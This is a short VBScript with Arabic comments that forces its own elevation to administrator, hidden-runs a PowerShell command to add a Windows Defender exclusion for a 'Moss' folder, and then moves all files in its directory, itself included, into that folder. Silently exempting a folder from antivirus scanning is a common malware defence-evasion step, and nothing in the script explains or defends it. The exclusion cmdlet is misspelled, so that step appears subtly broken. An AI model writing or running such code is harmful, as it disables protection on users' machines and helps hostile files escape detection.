If Not WScript.Arguments.Named.Exists("elevated") Then
    CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 1
    WScript.Quit
End If

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' تحديد مسار السكربت الحالي
Dim scriptPath
scriptPath = objFSO.GetParentFolderName(WScript.ScriptFullName)

' تحديد مسار المجلد الجديد
Dim strNewFolder
strNewFolder = scriptPath & "\Moss"

' إضافة مسار المجلد الجديد إلى مسارات الاستثناء
objShell.Run "cmd /c powershell -Command Add-MpPreferences -ExclusionPath """ & strNewFolder & """", 0, True

' انتظر 14 ثانية
WScript.Sleep 14000

On Error Resume Next ' تفعيل معالجة الخطأ

' التحقق إذا كان المسار الحالي هو مجلد "Moss"
If objFSO.GetFolder(scriptPath).Name = "Moss" Then
    strParentFolder = objFSO.GetParentFolderName(scriptPath)
    
    ' نقل جميع الملفات إلى المجلد الأب
    For Each objFile In objFSO.GetFolder(scriptPath).Files
        objFSO.MoveFile objFile.Path, strParentFolder & "\"
    Next
    
    ' نقل السكربت نفسه إلى المجلد الأب
    objFSO.MoveFile WScript.ScriptFullName, strParentFolder & "\"
Else
    ' إنشاء المجلد الجديد إذا لم يكن موجودًا
    If Not objFSO.FolderExists(strNewFolder) Then
        objFSO.CreateFolder(strNewFolder)
    End If
    
    ' نقل جميع الملفات إلى المجلد الجديد
    For Each objFile In objFSO.GetFolder(scriptPath).Files
        objFSO.MoveFile objFile.Path, strNewFolder & "\"
    Next
    
    ' نقل السكربت نفسه إلى المجلد الجديد
    objFSO.MoveFile WScript.ScriptFullName, strNewFolder & "\"
End If

On Error GoTo 0 ' تعطيل معالجة الخطأ
